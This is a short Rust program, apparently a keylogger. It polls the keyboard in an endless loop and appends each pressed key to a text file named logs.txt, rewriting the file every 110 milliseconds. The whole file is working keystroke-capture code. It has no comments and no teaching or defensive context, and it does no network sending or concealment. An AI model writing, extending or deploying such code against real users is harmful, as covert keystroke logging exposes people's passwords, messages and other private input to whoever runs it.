use std::fs::{self, File};
use std::{io::{self, Write}, process::Command, thread, time::Duration};
use std::io::prelude::*;
use device_query::{DeviceQuery, DeviceState, Keycode};

fn write_to_file(path: &str, contents: &str) -> Result<(), Box<dyn std::error::Error>> {
    fs::write(&path, &contents)?;
    Ok(())
}

fn main() {
    let file_name: &str = "logs.txt";
    let mut log_content = String::from("");
    let mut log_content_addon = String::from("");
    let device_state = DeviceState::new();
    loop {
        loop {
            let keys: Vec<Keycode> = device_state.get_keys();
            if !keys.is_empty(){
                log_content_addon = keys[0].to_string().to_lowercase();
                break;
            }
        }
        log_content = log_content.to_owned() + "-" + &log_content_addon;
        match write_to_file(&file_name, &log_content) {
            Ok(_) => (),
            Err(_) => println!("couldn't write to file")
        }
        wait_for(110);
    }
}

fn wait_for(millis: u64) {
    io::stdout().flush().unwrap();
    thread::sleep(Duration::from_millis(millis));
}
